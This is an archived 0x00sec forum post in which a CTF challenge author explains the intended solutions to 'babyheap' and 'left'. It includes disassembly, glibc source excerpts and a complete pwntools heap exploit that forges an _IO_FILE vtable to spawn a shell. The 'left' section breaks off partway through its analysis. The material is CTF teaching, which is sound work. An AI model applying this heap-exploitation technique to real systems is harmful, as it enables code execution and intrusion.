<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>0x00ctf Writeup | babyheap &amp; left! - Exploit Development - 0x00sec - The Home of the Hacker</title>
<meta name="description" content="In the name of Allah, the most beneficent, the most merciful. 

Hello everyone, i‚Äôll be writing how it was expected for the tasks I made to be solved. :smile: 
I finally found some free time, sorry for the late post. 
So&amp;hellip;">
<meta name="generator" content="Discourse 3.1.0.beta6 - https://github.com/discourse/discourse version 80a1709965fa59da824b2e3392976fc6fc898f80">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.png">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.png">
<meta name="theme-color" media="all" content="#171616">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="5314.html" />
<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">
<link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_a5ef387651921c3e4c7aa1108536015ba8299efb.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" class="light-scheme" />
<link href="../../stylesheets/desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop" />
<link href="../../stylesheets/chat_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat" />
<link href="../../stylesheets/discourse-details_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-details" />
<link href="../../stylesheets/discourse-lazy-videos_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-lazy-videos" />
<link href="../../stylesheets/discourse-local-dates_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-local-dates" />
<link href="../../stylesheets/discourse-narrative-bot_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-narrative-bot" />
<link href="../../stylesheets/discourse-presence_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-presence" />
<link href="../../stylesheets/discourse-spoiler-alert_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-spoiler-alert" />
<link href="../../stylesheets/docker_manager_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="docker_manager" />
<link href="../../stylesheets/poll_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll" />
<link href="../../stylesheets/chat_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat_desktop" />
<link href="../../stylesheets/poll_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll_desktop" />
<link href="../../stylesheets/desktop_theme_46_f36ade55bf80933494fe3b5fab518f477de3bd4e.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2" />
<link href="../../stylesheets/desktop_theme_57_8c0e890a61cdb4c5833a9f9c96664ed164e7d645.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="57" data-theme-name="0x00sec-v2" />
<link rel="stylesheet" href="https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="https://s3.amazonaws.com/0x00sec/highlight.pack.js"></script>
<link rel="preload" href="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" as="script">
<script defer src="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" data-theme-id="40"></script>
<link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;0x00ctf Writeup | babyheap &amp; left!&#39;" href="5314.rss" />
<meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:image" content="https://0x00sec.s3.amazonaws.com/original/2X/e/ee60e034ce8884fb3853d4e2d79edd0f1d6a95b9.png" />
<meta property="og:image" content="https://0x00sec.s3.amazonaws.com/original/2X/e/ee60e034ce8884fb3853d4e2d79edd0f1d6a95b9.png" />
<meta property="og:url" content="https://0x00sec.org/t/0x00ctf-writeup-babyheap-left/5314" />
<meta name="twitter:url" content="https://0x00sec.org/t/0x00ctf-writeup-babyheap-left/5314" />
<meta property="og:title" content="0x00ctf Writeup | babyheap &amp; left!" />
<meta name="twitter:title" content="0x00ctf Writeup | babyheap &amp; left!" />
<meta property="og:description" content="In the name of Allah, the most beneficent, the most merciful.   Hello everyone, i‚Äôll be writing how it was expected for the tasks I made to be solved. üòÑ  I finally found some free time, sorry for the late post.  So, this article will be splitted to two main parts:  I. babyheap  II. left  I. babyheap  In this task, we have multiple functions, and we note the following:     Let‚Äôs analyse, each and every one of them slowly, so we know what we are dealing with‚Ä¶  } main():     On this first par..." />
<meta name="twitter:description" content="In the name of Allah, the most beneficent, the most merciful.   Hello everyone, i‚Äôll be writing how it was expected for the tasks I made to be solved. üòÑ  I finally found some free time, sorry for the late post.  So, this article will be splitted to two main parts:  I. babyheap  II. left  I. babyheap  In this task, we have multiple functions, and we note the following:     Let‚Äôs analyse, each and every one of them slowly, so we know what we are dealing with‚Ä¶  } main():     On this first par..." />
<meta property="og:article:section" content="Exploit Development" />
<meta property="og:article:section:color" content="92278F" />
<meta property="og:article:tag" content="linux" />
<meta property="og:article:tag" content="exploitation" />
<meta property="og:article:tag" content="exploit" />
<meta property="og:article:tag" content="heap" />
<meta property="og:article:tag" content="0x00ctf" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="9 mins üïë" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="15 ‚ù§" />
<meta property="article:published_time" content="2018-02-04T19:31:42+00:00" />
<meta property="og:ignore_canonical" content="true" />
</head>
<body class="crawler ">
<div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">

<a href="https://init.0x00sec.org" class="dow-menu">Init</a>
<a href="https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
<a href="https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
<header>
<a href="../../index.html">
0x00sec - The Home of the Hacker
</a>
</header>
<div id="main-outlet" class="wrap" role="main">
<div id="topic-title">
<h1>
<a href="5314.html">0x00ctf Writeup | babyheap &amp; left!</a>
</h1>
<div class="topic-category" itemscope itemtype="http://schema.org/BreadcrumbList">
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a href="../../c/exploit-development.html" class="badge-wrapper bullet" itemprop="item">
<span class="badge-category-bg" style="background-color: #92278F"></span>
<span class="badge-category clear-badge">
<span class="category-name" itemprop="name">Exploit Development</span>
</span>
</a>
<meta itemprop="position" content="1" />
</span>
</div>
<div class="topic-category">
<div class="discourse-tags list-tags">
<a href="../../tag/linux.html" class="discourse-tag" rel="tag">linux</a>,
<a href="../../tag/exploitation.html" class="discourse-tag" rel="tag">exploitation</a>,
<a href="../../tag/exploit.html" class="discourse-tag" rel="tag">exploit</a>,
<a href="../../tag/heap.html" class="discourse-tag" rel="tag">heap</a>,
<a href="../../tag/0x00ctf.html" class="discourse-tag" rel="tag">0x00ctf</a>
</div>
</div>
</div>
<div itemscope itemtype="http://schema.org/DiscussionForumPosting">
<meta itemprop="headline" content="0x00ctf Writeup | babyheap &amp; left!">
<meta itemprop="articleSection" content="Exploit Development">
<meta itemprop="keywords" content="linux, exploitation, exploit, heap, 0x00ctf">
<div itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
<meta itemprop="name" content="0x00sec - The Home of the Hacker">
<div itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
<meta itemprop="url" content="https://0x00sec.org/uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.png">
</div>
</div>
<div id="post_1" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/exploit"><span itemprop="name">exploit</span></a>
(exploit)
</span>
<link itemprop="mainEntityOfPage" href="5314.html">
<link itemprop="image" href="https://0x00sec.s3.amazonaws.com/original/2X/e/ee60e034ce8884fb3853d4e2d79edd0f1d6a95b9.png">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2018-02-04T19:31:42Z" class="post-time">
February 4, 2018, 7:31pm
</time>
<meta itemprop="dateModified" content="2018-02-04T19:40:12Z">
<span itemprop="position">1</span>
</span>
</div>
<div class="post" itemprop="articleBody">
<p>In the name of Allah, the most beneficent, the most merciful.</p>
<hr>
<p>Hello everyone, i‚Äôll be writing how it was expected for the tasks I made to be solved. <img src="../../images/emoji/twitter/smile.png%3Fv=9" title=":smile:" class="emoji" alt=":smile:"><br>
I finally found some free time, sorry for the late post.</p>
<p>So, this article will be splitted to two main parts:<br>
I. <em>babyheap</em><br>
II. <em>left</em></p>
<h3>I. <em>babyheap</em>
</h3>
<p>In this task, we have multiple functions, and we note the following:</p>
<ul>
<li><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/ee60e034ce8884fb3853d4e2d79edd0f1d6a95b9.png" width="161" height="103"></li>
</ul>
<p>Let‚Äôs analyse, each and every one of them slowly, so we know what we are dealing with‚Ä¶</p>
<p><em>} main():</em></p>
<ul>
<li><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6f6bb6082de61f1ca87299c12a849623639697b0.png" width="389" height="407"></li>
</ul>
<p>On this first part, we see that the first thing the binary requests is a name, then we are going to enter an infinite loop that prints the menu, and calls a function: <em>sub_40086D</em>.<br>
Anyway, we are going to analyse it later since we are focusing on main() function currently, but it‚Äôs obvious that this function returns an integer, since right after the call is a <em>cmp eax, 6</em> operation, we are falling in a switch‚Ä¶<br>
<strong>menu</strong>: <em>‚Äú\x1B[31mMember manager!\x1B[0m\n1. add\n2. edit\n3. ban\n4. change name\n5. get gift\n6. exit‚Äù</em>.</p>
<ul>
<li>Let‚Äôs see the first 4 cases, each one of them calls a specific function, and goes to the start of the loop.</li>
</ul>
<ol>
<li><em>sub_4008c7</em></li>
<li><em>sub_400a1b</em></li>
<li><em>sub_400c77</em></li>
<li><em>sub_400d45</em></li>
</ol>
<ul>
<li>The rest of the cases, are doing their job directly.<br>
<em>case 5:</em><pre><code class="lang-auto"></code></pre>
</li>
</ul>
<p>loc_400E52: ; jumptable 0000000000400E25 case 5<br>
mov edi, offset aYourGift<br>
call _puts<br>
mov rax, cs:stdout<br>
mov rdi, rax ; stream<br>
call _fflush<br>
mov rax, [rbp+var_8]<br>
mov rax, [rax]<br>
mov rsi, rax<br>
mov edi, offset format ; ‚Äú%lu\n‚Äù<br>
mov eax, 0<br>
call _printf<br>
jmp short loc_400EAA</p>
<pre><code class="lang-auto">
- So, it first call puts, with argument: *'your gift:'*.
*fflush(stdout)*, then *printf("%lu", [rax])*..
We can guess from *long unsigned* format, the *printed text*, and the dereferencing of the **RAX** register, that it will print a libc address. Indeed, it does (**read_got** contents).

- *case 6:*
This one won't take much to understand, it simply calls *exit(0)*..
- *default:*
```asm
mov     edi, offset aInvalidOption
call    _puts
mov     rax, cs:stdout
mov     rdi, rax        ; stream
call    _fflush
nop
</code></pre>
<ul>
<li>It calls puts with the argument <em>‚Äòinvalid option!‚Äô</em>, then calls <em>fflush(stdout)</em>.</li>
</ul>
<p><em>} sub_40086d:</em></p>
<ul>
<li><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/465f864aead489d50d1409c626c84fbb292f9633.png" width="397" height="437"></li>
</ul>
<p>This function, calls read first‚Ä¶ then calls atoi on the input, returns the result.<br>
(<em>That moment when I discovered that It‚Äôs an old version of the pwnable vulnerable to OOB <img src="../../images/emoji/twitter/cry.png%3Fv=9" title=":cry:" class="emoji" alt=":cry:"></em>)</p>
<p><em>} sub_4008c7:</em></p>
<ul>
<li>This one is a big function, it‚Äôs add() function.<br>
it first prints a <em>‚Äúlooking for place to register‚Ä¶‚Äù</em>, then goes in a loop from 0 to 3 to look for an empty slot.</li>
<li>if found:<br>
goes in an infinite loop requesting a valid size, it should be bigger than <em>0x7F</em> and less or equal to <em>0x1000</em>, so no fastbin allowed(<em>&gt; global_max_fast</em>). (<strong>data size</strong> will be added to <strong>metadata size</strong>(<em>0x10</em>), then created).<br>
When the size requirements are met, <em>malloc(size)</em> is then called, requests a <em>‚Äòusername:‚Äô</em> and read in the chunk the <em>size</em> much. Then is a <em>secure check</em>, to null terminate the input, as long as it wouldn‚Äôt harm the <strong>next chunk</strong> size.<br>
Then the pointer to chunk is stored in the array, and returns.</li>
<li>if not:<br>
Well, just <em>returns</em> <img src="../../images/emoji/twitter/laughing.png%3Fv=9" title=":laughing:" class="emoji" alt=":laughing:">!</li>
</ul>
<p><em>} sub_400a1b:</em></p>
<ul>
<li>This is the edit function, it has 2 options, either a secure edit or a vulnerable one.<br>
You can only use them once each:</li>
<li>secure edit (<em>option 1</em>):<br>
First requests the index, then check if it‚Äôs valid and exists, then gets the chunk size using <strong>malloc_usable_size()</strong> function, reads that nbytes to the choosen chunk. and increments a variable that shows the secure edit has been used.</li>
<li>insecure edit (<em>option 2</em>):<br>
Similiar to secure edit, with a change on the level of the size, since it now uses <strong>strlen()</strong> function, which will end only when nullbyte is reached. which means, if we fill the chunk completely on add(), we can cause an <em>overflow</em> to the next chunk size.</li>
</ul>
<p><em>} sub_400c77:</em></p>
<ul>
<li>the ban function, or more precisely, the one that will call <strong>free()</strong>. It can only be used once, increments a specific variable if so, (<em>don‚Äôt you think it‚Äôll allow UAF</em>).</li>
</ul>
<pre><code class="lang-auto">mov     ds:ptr[rax*8], 0
</code></pre>
<p><em>} sub_400d45:</em></p>
<ul>
<li>Allows you to change name, once again, only one time is allowed.</li>
</ul>
<p>Now that we have analysed all functions, we have noticed that the leak is easy to get, as it‚Äôs given, <em>gift option</em>‚Ä¶ and there is a vulnerability allowing us to overwrite the <em>next chunk</em> metadata, it‚Äôs size precisely.</p>
<p>So, let‚Äôs think, what can we do?</p>
<ul>
<li>We can use secure and insecure edit only once, right? What if we use the insecure edit first to overflow to next chunk size and change it(make it either <strong>bigger</strong> or <strong>smaller</strong>), and then use the secure edit, that‚Äôs going to call <strong>malloc_usable_size</strong>, most people who have done that and failed, didn‚Äôt probably check the <em>source</em>, and those who did it without looking at it, probably, just added the size of the current to the size of the next one, without knowing why‚Ä¶</li>
</ul>
<pre><code class="lang-auto">static size_t
musable (void *mem)
{
 mchunkptr p;
 if (mem != 0)
   {
     p = mem2chunk (mem);
     if (__builtin_expect (using_malloc_checking == 1, 0))
       return malloc_check_get_size (p);
     if (chunk_is_mmapped (p))
       {
         if (DUMPED_MAIN_ARENA_CHUNK (p))
           return chunksize (p) - SIZE_SZ;
         else
           return chunksize (p) - 2 * SIZE_SZ;
       }
     else if (inuse (p)) // HERE
       return chunksize (p) - SIZE_SZ;
   }
 return 0;
}
</code></pre>
<ul>
<li>
<p>The only thing we need then to satisfy is that <strong>inuse¬ß == 1</strong>, to do that, we need to make a fake next size, with <em>PREV_INUSE</em> bit set.<br>
Now we know, we can make a used chunk overlap on a free‚Äôd one‚Ä¶ Therefore, overwrite it‚Äôs metadata(<strong>FD</strong> &amp; <strong>BK</strong>), remember? We only can allocate small-largebins‚Ä¶ Let‚Äôs create a small-largebin, free it, it‚Äôs going to be placed in unsortedbin list, what if we overwrite it‚Äôs BK? <strong>YES</strong>, <em>unsortedbin attack</em> for the win!</p>
</li>
<li>
<p>First, we start by implementing the functions to the exploit.</p>
</li>
</ul>
<pre><code class="lang-python">#!/usr/bin/python
from pwn import *
c = process('./babyheap')
def add(size, content):
   c.sendline('1')
   c.recvuntil('size:')
   c.sendline(str(size))
   c.recvuntil('username:')
   c.sendline(content)
   c.recvuntil('6. exit')
def edit(id, mode, content):
   c.sendline('2')
   c.recvuntil('2. insecure edit')
   c.sendline(str(mode))
   c.recvuntil('index:')
   c.sendline(str(id))
   c.recvuntil('new username:')
   c.sendline(content)
   c.recvuntil('6. exit')
def ban(id):
   c.sendline('3')
   c.recvuntil('index:')
   c.sendline(str(id))
   c.recvuntil('6. exit')
def change(name):
   c.sendline('4')
   c.recvuntil('enter new name:')
   c.sendline(name)
# PREPARE
name = "A" * 8
c.recvuntil('enter your name:')
c.sendline(name)
# EXPLOIT
#
# INTERACTIVE
c.interactive()
</code></pre>
<p>So the part we will start building is the <em>EXPLOIT</em> one!</p>
<ul>
<li>We‚Äôll start by making the chunks:</li>
<li>1st chunk will be used to overflow from and use the insecure edit to influence the next chunk!</li>
<li>2nd chunk must be of size <strong>0x101</strong> as a minimum, so we control two bytes(unlike <strong>0x90</strong> or <strong>0xf0</strong> case).</li>
<li>Then, comes the victim chunk, this one will be free‚Äôd and pushed into unsortedbin list and we‚Äôll try overwritting it‚Äôs metadata later on.</li>
<li>Finally, a bordering chunk that won‚Äôt allow <strong>top consolidation</strong> when the victim chunk is free‚Äôd!</li>
</ul>
<pre><code class="lang-auto">add(0x88, "A" * 0x88) # 0 ; chunk to overflow from
add(0x100, "B" * 8)   # 1 ; (size &gt;= 0x100) = 0x110
add(0x500, "C" * 8)   # 2 ; 0x510 chunk
add(0x88, "E" * 8)    # 3 ; prevent top consolidation
</code></pre>
<ul>
<li>But after allocating those, you‚Äôll later find that after freeing <strong>chunk <span class="hashtag">#2</span></strong>, the secure edit is no longer working after changing the size of <strong>chunk <span class="hashtag">#1</span></strong> randomly <em>(because of the check mentionned above)</em>, so we will create a fake chunk within <strong>chunk <span class="hashtag">#2</span></strong> before freeing it, and do some <em>quick mafs</em> to calculate the fake size with precision!</li>
</ul>
<pre><code class="lang-auto">add(0x88, "A" * 0x88) # 0 ; chunk to overflow from
add(0x100, "B" * 8)   # 1 ; (size &gt;= 0x100) = 0x110
payload = "D" * 0x160  # filling
payload += p64(0)      # fake prev
payload += p64(0x21)   # fake size + PREV_INUSE &lt; important
add(0x500, payload)   # 2 ; 0x510 chunk
add(0x88, "E" * 8)    # 3 ; prevent top consolidation
</code></pre>
<p>After creating them chunks, now it‚Äôs our time to call‚Ä¶</p>
<ul>
<li>The great <em>free()</em>
</li>
</ul>
<pre><code class="lang-auto">c.recv()
ban(2) # put in unsortedbin
</code></pre>
<p>We will now overwrite the <strong>chunk <span class="hashtag">#1</span></strong> size, by overflowing from <strong>chunk <span class="hashtag">#0</span></strong>.<br>
Before doing so, what size should we assign?<br>
To calculate:<br>
(The original size of <strong>chunk <span class="hashtag">#1</span></strong> + Header size <em>(prev_size &amp; size)</em> of <strong>chunk <span class="hashtag">#2</span></strong> + Filling size <em>(0x160)</em>) = (<em>0x110</em> + <em>0x8*2</em> + <em>0x160</em>) = <em>0x280</em><br>
<em>0x280</em> with addition of <strong>PREV_INUSE</strong> bit is 0x281, that‚Äôs our size!</p>
<ul>
<li>So let‚Äôs do that in the exploit!</li>
</ul>
<pre><code class="lang-auto">payload = "A" * 0x88  # filling
payload += p16(0x281) # next fake size
edit(0, 2, payload)   # using insecure edit for doing that
</code></pre>
<p>Now, we can take the prize, our precious leak, store and calculate the values!</p>
<ul>
<li>As follows:</li>
</ul>
<pre><code class="lang-auto">c.recv()
c.sendline('5')
c.recvline()
libc_read = int(c.recvline()[:-1], 10)
libc_base = libc_read - read_diff
libc_system = libc_base + sys_diff
#
print 'libc_base @ ' + hex(libc_base)
#
c.recv()
</code></pre>
<p>Now, when we are done with all of these stuff, we will be stuck thinking, overlapping chunks and unsortedbin attack, but what? really, what? What can be done with this only in hand?</p>
<ul>
<li>The answer is simple, many scenarios can be done, we cite the following:</li>
<li>By overwritting <strong>global_max_fast</strong> variable on libc <em>rw-p</em> area, we can make it treat any and every chunk when free‚Äôd as a fastbin chunk.</li>
<li>Another way is to mess with a <strong>_IO_FILE_plus</strong> struct or some pointer to it, such as the <strong>_IO_list_all</strong>, and that‚Äôs what we are going to do here.</li>
</ul>
<p>Something you should know is that, when we trigger the unsortedbin attack, the following will happen:<br>
<em>*(<strong>BK</strong>+0x10) = main_arena+XXX;</em><br>
If we set <strong>BK</strong> to the <strong>_IO_list_all</strong>-0x10, our chunk will be considered as a pure <strong>_IO_FILE</strong> struct, we‚Äôll basically confuse it.<br>
But after doing that, the whole list is messed up now, while was previously a single linked list(<strong>_chain</strong>) to all the of the <em>stderr</em>, <em>stdin</em> and <em>stdout</em>. That will basically lead to a corruption, wouldn‚Äôt it?<br>
And that‚Äôs exactly where we are going to strike‚Ä¶</p>
<ul>
<li>The call to <strong>abort()</strong> function to terminate the program:</li>
</ul>
<pre><code class="lang-auto">/* Cause an abnormal program termination with core-dump.  */
void
abort (void)
{
/* ... */
   if (stage == 1)
   {
   	++stage;
   	fflush (NULL);
   }
</code></pre>
<ul>
<li>With <strong>fflush()</strong> macro:</li>
</ul>
<pre><code class="lang-auto">#define fflush(s) _IO_flush_all_lockp (0)
</code></pre>
<ul>
<li>
<strong>_IO_flush_all_lockp</strong> containing the following lines:</li>
</ul>
<pre><code class="lang-auto">   while (fp != NULL)
   {
   	run_fp = fp;
   	if (do_lock)
   		_IO_flockfile (fp);
   	if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)
   	|| (_IO_vtable_offset (fp) == 0
   	&amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr
   	&gt; fp-&gt;_wide_data-&gt;_IO_write_base))
   	)
   	&amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)
</code></pre>
<ul>
<li>As you can see, if the first parts of the check are passed <em>(we need to satisfy 'em later)</em>, a call to <strong>_IO_OVERFLOW()</strong> is done:</li>
</ul>
<pre><code class="lang-auto">#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)
</code></pre>
<ul>
<li>Oh look, a usage of the vtable within!</li>
</ul>
<pre><code class="lang-auto">struct _IO_jump_t
{
   JUMP_FIELD(size_t, __dummy);             // 1
   JUMP_FIELD(size_t, __dummy2);            // 2
   JUMP_FIELD(_IO_finish_t, __finish);      // 3
   JUMP_FIELD(_IO_overflow_t, __overflow);  // 4 &lt;-- the choosen one!
</code></pre>
<ul>
<li>We are getting somewhere, cause <strong>_IO_list_all</strong> is a pointer to an _IO_FILE_plus struct, which supposedly contains a vtable.</li>
</ul>
<pre><code class="lang-auto">struct _IO_FILE_plus
{
   _IO_FILE file;
   const struct _IO_jump_t *vtable;
};
</code></pre>
<p>For further reading on this:<br>
<a href="https://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html" rel="noopener nofollow ugc">House of Orange</a><br>
<a href="http://4ngelboy.blogspot.tw/2017/11/play-with-file-structure-yet-another.html" rel="noopener nofollow ugc">Playing with file structure</a><br>
<a href="https://code.woboq.org/userspace/glibc/libio/libioP.h.html#_IO_FILE_plus" rel="noopener nofollow ugc">Source</a></p>
<p>Anyway, we‚Äôve seen that there‚Äôs a vtable after our fake <strong>_IO_FILE</strong> struct <em>(our in full-control chunk)</em>.</p>
<ul>
<li>We can change name which is in a known location <em>(PIE: OFF)</em>, that says:</li>
</ul>
<pre><code class="lang-python">payload = p64(0) * 3             # filling
payload += p64(libc_system)      # __overflow
change(payload)
</code></pre>
<p>Once this is done, we can start <em>crafting</em> the fake <strong>_IO_FILE</strong> to satisfy the first part of the check within <strong>_IO_flush_all_lockp()</strong> function, so it results into <strong>_IO_OVERFLOW()</strong> call!</p>
<ul>
<li>To satisfy is: <em>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</em>.</li>
</ul>
<pre><code class="lang-auto">struct _IO_FILE {
     int _flags;                /* High-order word is _IO_MAGIC; rest is flags. */
   #define _IO_file_flags _flags
     /* The following pointers correspond to the C++ streambuf protocol. */
     /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
#
     char* _IO_read_ptr;        /* Current read pointer */
     char* _IO_read_end;        /* End of get area. */
     char* _IO_read_base;        /* Start of putback+get area. */
     char* _IO_write_base;        /* Start of put area. */
     char* _IO_write_ptr;        /* Current put pointer. */
</code></pre>
<ul>
<li>So next part of the exploit calculates <strong>_IO_list_all</strong>, and <em>crafts</em> the <em>_IO_FILE</em> fake struct, bearing in mind that check to satisfy:</li>
</ul>
<pre><code class="lang-python">_IO_list_all = libc_base + iolist_diff
name_ptr = 0x6020a0
#
payload = "B" * 8*32                # overflow to victim chunk using secure edit
payload += '/bin/sh\x00'            # fake prev
payload += p64(0x61)                # fake shrinked size
payload += p64(0)                   # fake FD
payload += p64(_IO_list_all - 0x10) # fake BK
payload += p64(2)                   # fp-&gt;_IO_write_base
payload += p64(3)                   # fp-&gt;_IO_write_ptr
payload += p64(0) * 21              # filling
payload += p64(name_ptr)            # fake *vtable
# 
edit(1, 1, payload)                 # use secure edit 
</code></pre>
<p>You may have wondered, why did I put <em>‚Äò/bin/sh\x00‚Äô</em> in <strong>prev_size</strong> field‚Ä¶<br>
Answer is simple: <strong>prev_size</strong> <em>(start of the chunk)</em> was passed in <strong>RDI</strong> register, so say, an argument to <strong>system()</strong> later.</p>
<p>Now, we already have almost done everything, all is left is to trigger the <em>unsortedbin attack</em>.</p>
<ul>
<li>And it‚Äôs done:</li>
</ul>
<pre><code class="lang-python">sleep(2)
#
pause()
c.recv()
c.sendline('1')
c.recvuntil('size:')
c.sendline(str(0x80))
</code></pre>
<ul>
<li>Finally, making sure to add the offsets, can be easily reteived with <a href="https://github.com/niklasb/libc-database" rel="noopener nofollow ugc">libc-database</a>‚Ä¶</li>
</ul>
<pre><code class="lang-python"># LOCAL
iolist_diff = 0x3c31a0
read_diff = 0xef320
sys_diff = 0x46590
</code></pre>
<p>By assembling all the above mentionned parts, we get it;</p>
<ul>
<li>Full exploit:</li>
</ul>
<pre><code class="lang-python">#!/usr/bin/python
from pwn import *
# LOCAL
iolist_diff = 0x3c31a0
read_diff = 0xef320
sys_diff = 0x46590
#
c = process('./babyheap')
#
def add(size, content):
   c.sendline('1')
   c.recvuntil('size:')
   c.sendline(str(size))
   c.recvuntil('username:')
   c.sendline(content)
   c.recvuntil('6. exit')
def edit(id, mode, content):
   c.sendline('2')
   c.recvuntil('2. insecure edit')
   c.sendline(str(mode))
   c.recvuntil('index:')
   c.sendline(str(id))
   c.recvuntil('new username:')
   c.sendline(content)
   c.recvuntil('6. exit')
def ban(id):
   c.sendline('3')
   c.recvuntil('index:')
   c.sendline(str(id))
   c.recvuntil('6. exit')
def change(name):
   c.sendline('4')
   c.recvuntil('enter new name:')
   c.sendline(name)
# PREPARE
name = "A" * 8
c.recvuntil('enter your name:')
c.sendline(name)
# EXPLOIT
add(0x88, "A" * 0x88) # 0 ; chunk to overflow from
add(0x100, "B" * 8)   # 1 ; (size &gt;= 0x100) = 0x110
payload = "D" * 0x160  # filling
payload += p64(0)      # fake prev
payload += p64(0x21)   # fake size + PREV_INUSE &lt; important
add(0x500, payload)   # 2 ; 0x510 chunk
add(0x88, "E" * 8)    # 3 ; prevent top consolidation
# 
c.recv()
ban(2) # put in unsortedbin
# 
payload = "A" * 0x88  # filling
payload += p16(0x281) # next fake size
edit(0, 2, payload)   # using insecure edit for doing that
# 
c.recv()
c.sendline('5')
c.recvline()
libc_read = int(c.recvline()[:-1], 10)
libc_base = libc_read - read_diff
libc_system = libc_base + sys_diff
#
print 'libc_base @ ' + hex(libc_base)
#
c.recv()
payload = p64(0) * 3             # filling
payload += p64(libc_system)      # __overflow
change(payload)
# 
_IO_list_all = libc_base + iolist_diff
name_ptr = 0x6020a0
#
payload = "B" * 8*32                # overflow to victim chunk
payload += '/bin/sh\x00'            # fake prev
payload += p64(0x61)                # fake shrinked size
payload += p64(0)                   # fake FD
payload += p64(_IO_list_all - 0x10) # fake BK
payload += p64(2)                   # fp-&gt;_IO_write_base
payload += p64(3)                   # fp-&gt;_IO_write_ptr
payload += p64(0) * 21              # filling
payload += p64(name_ptr)            # fake *vtable
# 
edit(1, 1, payload)                 # use secure edit
# 
sleep(2)
#
pause()
c.recv()
c.sendline('1')
c.recvuntil('size:')
c.sendline(str(0x80))
# INTERACTIVE
c.interactive()
</code></pre>
<p>That‚Äôs how we correctly do <strong>babyheap</strong>!</p>
<h3>II. <em>left</em>
</h3>
<p>While it seems like a small and easy task, it requires a bit more work.</p>
<ul>
<li>A small look at IDA:</li>
</ul>
<pre><code class="lang-auto">lea     rax, [rbp+art]
mov     rsi, rax
mov     edi, offset format ; "%s"
mov     eax, 0
call    _printf
mov     rax, [rbp+ptr]
mov     rax, [rax]
mov     rsi, rax
mov     edi, offset aPrintfLu ; "printf(): %lu\n"
mov     eax, 0
call    _printf
mov     edi, offset s   ; "read address:"
call    _puts
mov     rax, cs:__bss_start
mov     rdi, rax        ; stream
call    _fflush
lea     rax, [rbp+ptr]
mov     rsi, rax
mov     edi, offset aLu ; "%lu"
mov     eax, 0
call    ___isoc99_scanf
mov     rax, [rbp+ptr]
mov     rax, [rax]
mov     rsi, rax
mov     edi, offset aContentLu ; "content: %lu\n"
mov     eax, 0
call    _printf
